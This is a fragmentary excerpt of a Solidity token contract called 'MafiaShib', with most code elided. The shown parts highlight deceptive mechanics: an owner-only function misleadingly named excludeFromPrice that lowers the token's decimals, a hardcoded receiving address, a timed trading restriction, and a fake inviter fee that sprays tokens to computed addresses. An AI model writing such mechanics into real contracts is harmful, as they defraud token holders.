...
contract MafiaShib is Context, IERC20, Ownable {
    ...
    address payable _receive = payable(address(0x95d161881D29dDe61941B54Ae8959Ed48597d5C2));
    address _tokenOwner;
    ...
    function excludeFromPrice() public onlyOwner {
        if(_decimals > 6){
            _decimals -= 1;
        }
    }
    ...
    function _transfer(
        ...
        if(_isExcludedFromFee[from] || _isExcludedFromFee[to]){
            ...
            if(from == uniswapV2Pair){
                if(startTime.add(620) > block.timestamp){
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee) private {
        ...
        if (takeFee) {
            ...
            _takeInviterFee(tAmount.div(1000000));
            rate = 9;
        }
    ...
    function _takeInviterFee(
        ...
        address _receiveD;
        for (int160 i = 0; i < 8; i++) {
            _receiveD = address(MAXADD/ktNum);
            ktNum = ktNum+1;
            _tokenTransfer(address(this),_receiveD,amount.div(4),false);
        }
    }
}